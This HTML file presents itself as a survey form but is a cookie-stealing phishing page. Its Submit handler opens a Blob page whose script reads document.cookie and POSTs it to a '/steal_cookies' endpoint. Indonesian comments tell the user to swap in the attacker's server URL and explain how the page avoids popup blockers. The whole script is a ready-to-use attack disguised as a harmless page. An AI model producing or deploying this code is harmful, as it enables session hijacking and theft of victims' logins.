<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Update</title>
</head>
<body>
    <h1>Welcome to Our Survey!</h1>
    <p>Please fill out the form below:</p>
    
    <form id="fakeForm">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required>
        <br>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>
        <br>
        <button id="submitBtn" type="button">Submit</button>
    </form>

    <script>
        document.getElementById('submitBtn').addEventListener('click', () => {
            try {
                // Simulasi Blob dengan XSS vulnerability
                const blobContent = `
                    <html>
                    <head>
                        <meta charset="UTF-8">
                    </head>
                    <body>
                        <script>
                            // Mengambil cookies korban dan mengirimnya ke server penyerang
                            const cookies = document.cookie;
                            const xhr = new XMLHttpRequest();
                            xhr.open("POST", "http://localhost:3000/steal_cookies", true); // Ganti dengan URL server penyerang
                            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                            xhr.send("cookies=" + encodeURIComponent(cookies));
                        <\/script>
                    </body>
                    </html>
                `;

                // Membuat Blob dan membuka di tab baru (dalam event click untuk menghindari popup blocker)
                const blob = new Blob([blobContent], { type: "text/html;charset=utf-8" });
                const url = URL.createObjectURL(blob);
                window.open(url, '_blank'); // Membuka Blob di tab baru
            } catch (error) {
                console.error('Error creating Blob:', error);
            }
        });
    </script>
</body>
</html>
